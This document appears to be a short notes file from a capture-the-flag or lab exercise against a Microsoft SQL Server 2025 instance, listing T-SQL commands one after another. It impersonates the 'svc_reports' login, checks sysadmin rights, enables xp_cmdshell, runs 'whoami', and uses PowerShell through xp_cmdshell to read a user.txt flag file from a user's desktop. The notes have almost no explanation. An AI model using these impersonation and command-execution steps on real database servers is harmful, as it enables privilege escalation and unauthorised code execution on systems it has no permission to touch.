# Microsoft SQL Server 2025 (RTM) - 17.0.1000.7 (X64) Oct 21 2025 12:05:57 Copyright (C) 2025 Microsoft Corporation Enterprise Developer Edition (64-bit) on Windows 10 Pro 10.0 <X64> (Build 26100: ) (Hypervisor)

Selct @@Version

SELECT SYSTEM_USER, ORIGINAL_LOGIN(), IS_SRVROLEMEMBER('sysadmin');

# SQL Login Impersonation
EXECUTE AS LOGIN = 'svc_reports'; SELECT SYSTEM_USER, ORIGINAL_LOGIN(), IS_SRVROLEMEMBER('sysadmin');

# turn on xp_cmdshell
EXECUTE AS LOGIN='svc_reports';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;         RECONFIGURE;
EXEC xp_cmdshell 'whoami';


EXECUTE AS LOGIN='svc_reports' EXEC xp_cmdshell 'powershell -c "type C:\Users\svc_sql\Desktop\user.txt"';

# quete
EXECUTE AS LOGIN='svc_reports' EXEC xp_cmdshell 'powershell -c "$aaa=\"123\";$aaa;"';